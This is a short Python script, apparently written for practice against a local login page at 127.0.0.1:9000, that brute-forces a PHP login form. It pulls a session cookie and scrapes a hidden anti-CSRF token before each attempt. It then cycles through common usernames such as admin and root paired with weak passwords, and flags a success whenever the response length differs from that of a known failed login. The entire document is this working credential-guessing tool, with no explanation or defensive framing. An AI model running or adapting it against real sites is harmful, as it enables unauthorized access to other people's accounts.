from urllib.request import *
from urllib.parse import *
import re


def getCookie():
    req=Request(url)
    response=urlopen(url)
    cookie=response.getheader('Set-Cookie')
    cookie=cookie.split('=')[1]
    cookie=cookie[:cookie.find(';')]
    return cookie


def getToken(cookie):
    pattern='(type="hidden" value=")([A-Za-z0-9]*)'
    req=Request(url)
    opener=build_opener()
    opener.addheaders.append(('Cookie','PHPSESSID='+cookie))
    response=opener.open(req)
    html=response.read()
    html=html.decode('utf-8')
    tokenSearch=re.search(pattern,html)
    token=tokenSearch.groups()[1]
    return token


def bruteForm(logins,passwords):
    cookie=getCookie()
    token=getToken(cookie)
    values={'login':'adsds','password':'aaaa','token':token}
    data=urlencode(values).encode('utf-8')
    opener=build_opener()
    opener.addheaders.append(('Cookie','PHPSESSID='+cookie))
    response=opener.open(url,data)
    error=len(response.read())
    
    for login in logins:
        values['login']=login
        for password in passwords:
            values['password']=password
            token=getToken(cookie)
            values['token']=token
            data=urlencode(values).encode('utf-8')
            response=opener.open(url,data)
            html=response.read()
            if len(html)!=error:
                print('[+]',end=' ')
            else:
                print('[-]',end=' ')
            print('{0}:{1}'.format(login,password))


url='http://127.0.0.1:9000'
logins=['administrator','user','root','admin']
passwords=['123454','admin','users','root','987654']
bruteForm(logins,passwords)
